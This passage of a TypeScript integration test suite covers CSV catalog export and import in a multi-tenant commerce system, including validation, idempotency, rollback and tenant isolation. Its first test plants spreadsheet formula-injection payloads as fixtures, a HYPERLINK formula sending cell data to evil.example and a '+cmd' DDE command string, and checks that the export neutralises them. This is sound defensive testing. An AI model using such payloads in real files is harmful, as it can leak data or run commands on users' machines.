        sku: "EVIL-1",
        slug: "evil-1",
        name: '=HYPERLINK("http://evil.example/?x="&A1)',
        description: 'line one\nline "two", with comma'
      });
      const plain = await makeProduct(TENANT_A, {
        sku: "OK-1",
        slug: "ok-1",
        name: "Plain"
      });
      await setAttributes(TENANT_A, evil.id, {
        weight: "-1.5",
        color: "red",
        note: "+cmd|' /C calc'!A0"
      });
      await setAttributes(TENANT_A, plain.id, { weight: "2" });

      const exported = await inTenant(TENANT_A, (tx) =>
        exportCatalogCsv(tx, TENANT_A, ACTOR)
      );
      expect(exported.truncated).toBe(false);
      expect(exported.rowCount).toBe(2);
      expect(exported.csv.charCodeAt(0)).toBe(0xfeff);
      expect(exported.csv).toContain(
        `"'=HYPERLINK(""http://evil.example/?x=""&A1)"`
      );
      expect(exported.csv).toContain(`'+cmd|' /C calc'!A0`);
      // A plain negative number is NOT quote-prefixed.
      expect(exported.csv).toContain(",-1.5\r\n");
      expect(exported.csv).toContain(`"line one\nline ""two"", with comma"`);
      expect(exported.csv.split("\r\n")[0]).toBe(
        "﻿sku,name,slug,type,status,categorySlug,price,discountPercent,stock,weightGrams,minPurchase,description,isFeatured,isRecommended,attr:color,attr:note,attr:weight"
      );

      const report = await inTenant(TENANT_A, (tx) =>
        dryRunCatalogImport(tx, TENANT_A, exported.csv)
      );
      expect(report.fatalErrors).toEqual([]);
      expect(report.valid).toBe(true);
      expect(report.summary).toEqual({
        create: 0,
        update: 0,
        unchanged: 2,
        error: 0
      });
    });

    test("dry-run writes nothing; apply performs exactly what the dry-run reported (parity)", async () => {
      await seedExportable();
      await makeProduct(TENANT_A, {
        sku: "EXIST",
        slug: "exist",
        name: "Old name",
        price: "1000.00"
      });

      const csv = [
        "sku,name,slug,price,stock,status,attr:weight,attr:color",
        "EXIST,New name,exist,2500.50,7,active,3.5,red",
        "NEW-1,Fresh,fresh,100,3,,0.25,blue",
        "NEW-2,Second,second,200,,,,"
      ].join("\r\n");

      const beforeProducts = await productCount(TENANT_A);
      const beforeValues = await valueCount(TENANT_A);
      const dry = await inTenant(TENANT_A, (tx) =>
        dryRunCatalogImport(tx, TENANT_A, csv)
      );
      expect(dry.valid).toBe(true);
      expect(dry.summary).toEqual({
        create: 2,
        update: 1,
        unchanged: 0,
        error: 0
      });
      expect(dry.rows.map((row) => [row.sku, row.action])).toEqual([
        ["EXIST", "update"],
        ["NEW-1", "create"],
        ["NEW-2", "create"]
      ]);
      expect(await productCount(TENANT_A)).toBe(beforeProducts);
      expect(await valueCount(TENANT_A)).toBe(beforeValues);

      const applied = await inTenant(TENANT_A, (tx) =>
        applyCatalogImport(tx, TENANT_A, ACTOR, csv, "key-1")
      );
      expect(applied.kind).toBe("applied");
      if (applied.kind !== "applied") return;
      expect(applied.report.summary).toEqual(dry.summary);
      expect(applied.report.rows.map((row) => [row.sku, row.action])).toEqual(
        dry.rows.map((row) => [row.sku, row.action])
      );
      expect(applied.report.batchId).toBeDefined();
      expect(applied.report.fileSha256).toBe(dry.fileSha256);

      const rows = (await getAdminSql()`
        SELECT sku, name, price::text AS price, stock, status
        FROM awcms_commerce_products WHERE tenant_id = ${TENANT_A} ORDER BY sku
      `) as {
        sku: string;
        name: string;
        price: string;
        stock: number;
        status: string;
      }[];
      expect(rows).toEqual([
        {
          sku: "EXIST",
          name: "New name",
          price: "2500.50",
          stock: 7,
          status: "active"
        },
        {
          sku: "NEW-1",
          name: "Fresh",
          price: "100.00",
          stock: 3,
          status: "draft"
        },
        {
          sku: "NEW-2",
          name: "Second",
          price: "200.00",
          stock: 0,
          status: "draft"
        }
      ]);
      expect(await valueCount(TENANT_A)).toBe(4);

      // Re-planning the same file is now a no-op on every row.
      const second = await inTenant(TENANT_A, (tx) =>
        dryRunCatalogImport(tx, TENANT_A, csv)
      );
      expect(second.summary).toEqual({
        create: 0,
        update: 0,
        unchanged: 3,
        error: 0
      });
    });

    test("all-or-nothing: one bad row blocks the whole file, with per-row diagnostics and no writes", async () => {
      await seedExportable();
      const csv = [
        "sku,name,slug,price,attr:weight,attr:color",
        "GOOD-1,Good,good-1,100,1.5,red",
        "BAD-1,Bad price,bad-1,12.345,1,red",
        "BAD-2,Bad attrs,bad-2,100,1;5,green",
        "GOOD-2,Good,good-1,100,,",
        ",NoSku,no-sku,100,,"
      ].join("\n");

      const beforeProducts = await productCount(TENANT_A);
      const outcome = await inTenant(TENANT_A, (tx) =>
        applyCatalogImport(tx, TENANT_A, ACTOR, csv, "key-bad")
      );
      expect(outcome.kind).toBe("invalid");
      if (outcome.kind !== "invalid") throw new Error("expected invalid");
      expect(outcome.report.valid).toBe(false);
      expect(outcome.report.summary).toEqual({
        create: 1,
        update: 0,
        unchanged: 0,
        error: 4
      });
      const byRow = Object.fromEntries(
        outcome.report.rows.map((row) => [row.row, row])
      );
      expect(byRow[2]!.errors.map((error) => error.column)).toEqual(["price"]);
      expect(byRow[3]!.errors.map((error) => error.column).sort()).toEqual([
        "attr:color",
        "attr:weight"
      ]);
      expect(byRow[4]!.errors.map((error) => error.column)).toEqual(["slug"]);
      expect(byRow[5]!.errors.map((error) => error.column)).toEqual(["sku"]);
      expect(await productCount(TENANT_A)).toBe(beforeProducts);
      expect(await valueCount(TENANT_A)).toBe(0);
      const batches = (await getAdminSql()`
        SELECT count(*)::int AS n FROM awcms_commerce_catalog_import_batches
      `) as { n: number }[];
      expect(Number(batches[0]!.n)).toBe(0);
    });

    test("a write-time conflict the planner could not see rolls the whole batch back", async () => {
      await seedExportable();
      const csv = [
        "sku,name,slug,price,attr:weight",
        "RACE-1,First,race-1,100,1",
        "RACE-2,Second,race-2,100,2"
      ].join("\n");

      // The planner sees a clean catalog, so the plan is valid. A concurrent
      // writer taking row 2's slug between plan and write is simulated, exactly
      // and deterministically, by a trigger that raises the very unique
      // violation (same constraint name) the second INSERT would hit.
      const admin = getAdminSql();
      await admin.unsafe(`
        CREATE OR REPLACE FUNCTION awcms_it_291_race() RETURNS trigger AS $fn$
        BEGIN
          IF NEW.slug = 'race-2' THEN
            RAISE EXCEPTION 'simulated concurrent insert'
              USING ERRCODE = '23505',
                    CONSTRAINT = 'awcms_commerce_products_tenant_slug_key';
          END IF;
          RETURN NEW;
        END
        $fn$ LANGUAGE plpgsql
      `);
      await admin.unsafe(`
        CREATE TRIGGER awcms_it_291_race BEFORE INSERT ON awcms_commerce_products
        FOR EACH ROW EXECUTE FUNCTION awcms_it_291_race()
      `);
      try {
        const outcome = await inTenant(TENANT_A, async (tx) => {
          const result = await applyCatalogImport(
            tx,
            TENANT_A,
            ACTOR,
            csv,
            "key-race"
          );
          // The request transaction is still healthy after the savepoint
          // rollback: it can keep querying (and would commit).
          const stillThere =
            (await tx`SELECT count(*)::int AS n FROM awcms_commerce_products`) as {
              n: number;
            }[];
          return { result, visibleInTx: Number(stillThere[0]!.n) };
        });
        expect(outcome.result.kind).toBe("rolled_back");
        // Row 1 had been written before row 2 failed — and is gone again.
        expect(outcome.visibleInTx).toBe(0);
      } finally {
        await admin.unsafe(
          `DROP TRIGGER IF EXISTS awcms_it_291_race ON awcms_commerce_products`
        );
        await admin.unsafe(`DROP FUNCTION IF EXISTS awcms_it_291_race()`);
      }

      expect(await productCount(TENANT_A)).toBe(0);
      expect(await valueCount(TENANT_A)).toBe(0);
      const batches = (await admin`
        SELECT count(*)::int AS n FROM awcms_commerce_catalog_import_batches
      `) as { n: number }[];
      expect(Number(batches[0]!.n)).toBe(0);
    });

    test("the same Idempotency-Key cannot apply twice (structural guard), and a different file is a different batch", async () => {
      await seedExportable();
      const csv = "sku,name,slug,price\nIDEM-1,One,idem-1,100";
      const first = await inTenant(TENANT_A, (tx) =>
        applyCatalogImport(tx, TENANT_A, ACTOR, csv, "same-key")
      );
      expect(first.kind).toBe("applied");

      // The key claim is the first write: a second apply reports
      // `duplicate_key` (the route replays / 409s) instead of a raw unique
      // violation, and writes nothing.
      const second = await inTenant(TENANT_A, (tx) =>
        applyCatalogImport(tx, TENANT_A, ACTOR, csv, "same-key")
      );
      expect(second.kind).toBe("duplicate_key");
      expect(await productCount(TENANT_A)).toBe(1);

      const batches = (await getAdminSql()`
        SELECT file_sha256, idempotency_key_hash, created_count FROM awcms_commerce_catalog_import_batches
      `) as {
        file_sha256: string;
        idempotency_key_hash: string;
        created_count: number;
      }[];
      expect(batches).toHaveLength(1);
      expect(batches[0]!.idempotency_key_hash).toMatch(/^[0-9a-f]{64}$/);
      expect(batches[0]!.idempotency_key_hash).not.toContain("same-key");
    });

    test("concurrent applies with one Idempotency-Key: exactly one wins, the rest are duplicate_key, never a raw error", async () => {
      await seedExportable();
      const csv =
        "sku,name,slug,price\nRACE-1,One,race-1,100\nRACE-2,Two,race-2,200";
      const outcomes = await Promise.all(
        [0, 1, 2, 3].map(() =>
          inTenant(TENANT_A, (tx) =>
            applyCatalogImport(tx, TENANT_A, ACTOR, csv, "race-key")
          )
        )
      );
      expect(outcomes.filter((o) => o.kind === "applied")).toHaveLength(1);
      expect(outcomes.filter((o) => o.kind === "duplicate_key")).toHaveLength(
        3
      );
      expect(await productCount(TENANT_A)).toBe(2);
      const batches = (await getAdminSql()`
        SELECT count(*)::int AS n FROM awcms_commerce_catalog_import_batches
      `) as { n: number }[];
      expect(batches[0]!.n).toBe(1);
    });

    test("a rolled-back apply releases its key claim, so the corrected file can reuse the key", async () => {
      await seedExportable();
      await makeProduct(TENANT_A, { sku: "TAKEN", slug: "taken-slug" });
      const conflicting =
        "sku,name,slug,price\nNEW-1,New,new-1,100\nNEW-2,New2,taken-slug,100";
      const first = await inTenant(TENANT_A, (tx) =>
        applyCatalogImport(tx, TENANT_A, ACTOR, conflicting, "retry-key")
      );
      expect(["rolled_back", "invalid"]).toContain(first.kind);
      const fixed = "sku,name,slug,price\nNEW-1,New,new-1,100";
      const second = await inTenant(TENANT_A, (tx) =>
        applyCatalogImport(tx, TENANT_A, ACTOR, fixed, "retry-key")
      );
      expect(second.kind).toBe("applied");
    });

    test("export without attributes.read carries only visible_public attribute columns", async () => {
      await seedExportable();
      const p = await makeProduct(TENANT_A, { sku: "PUB-1", slug: "pub-1" });
      await setAttributes(TENANT_A, p.id, {
        weight: "3",
        color: "blue",
        note: "secret-note"
      });
      const full = await inTenant(TENANT_A, (tx) =>
        exportCatalogCsv(tx, TENANT_A, ACTOR)
      );
      expect(full.csv).toContain("attr:note");
      expect(full.csv).toContain("secret-note");

      const limited = await inTenant(TENANT_A, (tx) =>
        exportCatalogCsv(tx, TENANT_A, ACTOR, undefined, false)
      );
      expect(limited.csv).toContain("attr:weight");
      expect(limited.csv).not.toContain("attr:note");
      expect(limited.csv).not.toContain("attr:color");
      expect(limited.csv).not.toContain("secret-note");
      expect(limited.csv).not.toContain("blue");
    });

    test("an import never matches, reads or writes another tenant's products", async () => {
      await makeProduct(TENANT_B, {
        sku: "SHARED",
        slug: "shared",
        name: "Tenant B product"
      });
      const csv = "sku,name,slug,price\nSHARED,Tenant A product,shared,100";
      const report = await inTenant(TENANT_A, (tx) =>
        dryRunCatalogImport(tx, TENANT_A, csv)
      );
      // SKU and slug are free in tenant A: this is a CREATE, not an update of B's row.
      expect(report.summary).toEqual({
        create: 1,
        update: 0,
        unchanged: 0,
        error: 0
      });
      const applied = await inTenant(TENANT_A, (tx) =>
        applyCatalogImport(tx, TENANT_A, ACTOR, csv, "tenant-a-key")
      );
      expect(applied.kind).toBe("applied");
      const b = (await getAdminSql()`
        SELECT name FROM awcms_commerce_products WHERE tenant_id = ${TENANT_B} AND sku = 'SHARED'
      `) as { name: string }[];
      expect(b[0]!.name).toBe("Tenant B product");
    });

    test("media references are not an import column; unknown columns and bad headers are fatal", async () => {
      await seedExportable();
      for (const header of [
        "sku,name,slug,price,imageUrl",
        "sku,name,slug,price,media",
        "sku,name,slug,price,attr:nope",
        "sku,sku,name",
        "name,slug,price"
      ]) {
        const report = await inTenant(TENANT_A, (tx) =>
          dryRunCatalogImport(tx, TENANT_A, `${header}\nA,B,c,1,x`)
        );
        expect(report.valid).toBe(false);
        expect(report.fatalErrors.length).toBeGreaterThan(0);
        expect(report.rows).toEqual([]);
      }
      expect(await productCount(TENANT_A)).toBe(0);
    });

    test("a large import at the row ceiling applies within a bounded time and re-plans as all-unchanged", async () => {
      await makeDefinition(TENANT_A, {
        key: "weight",
        valueType: "decimal",
        isFilterable: true
      });
      await makeDefinition(TENANT_A, {
        key: "color",
        isFilterable: true,
        isSearchable: true
      });
      const lines = ["sku,name,slug,price,stock,attr:weight,attr:color"];
      for (let index = 1; index <= MAX_CATALOG_IMPORT_ROWS; index += 1) {
        lines.push(
          `BULK-${index},Bulk product ${index},bulk-${index},${1000 + index},${index % 50},${(index % 97) / 4},${index % 2 === 0 ? "red" : "blue"}`
        );
      }
      const csv = lines.join("\r\n");

      const started = performance.now();
      const applied = await inTenant(TENANT_A, (tx) =>
        applyCatalogImport(tx, TENANT_A, ACTOR, csv, "bulk-key")
      );
      const elapsedMs = performance.now() - started;
      console.info(
        `[#291 evidence] applied ${MAX_CATALOG_IMPORT_ROWS} rows (2 attribute values each) in ${Math.round(elapsedMs)} ms`
      );
      expect(applied.kind).toBe("applied");
      if (applied.kind !== "applied") return;
      expect(applied.report.summary.create).toBe(MAX_CATALOG_IMPORT_ROWS);
      expect(applied.report.rowsTruncated).toBe(true);
      expect(await productCount(TENANT_A)).toBe(MAX_CATALOG_IMPORT_ROWS);
      expect(await valueCount(TENANT_A)).toBe(MAX_CATALOG_IMPORT_ROWS * 2);
      // Recorded in the ADR; a generous ceiling so a slow CI box does not flake.
      expect(elapsedMs).toBeLessThan(90_000);

      const again = await inTenant(TENANT_A, (tx) =>
        dryRunCatalogImport(tx, TENANT_A, csv)
      );
      expect(again.summary).toEqual({
        create: 0,
        update: 0,
        unchanged: MAX_CATALOG_IMPORT_ROWS,
        error: 0
      });

      // One row over the ceiling is refused up front, whatever its content.
      const over = await inTenant(TENANT_A, (tx) =>
        dryRunCatalogImport(tx, TENANT_A, `${csv}\r\nBULK-X,X,bulk-x,1,1,1,red`)
      );
      expect(over.valid).toBe(false);
      expect(over.fatalErrors[0]!.message).toContain("data rows");
    }, 180000);
  });
});
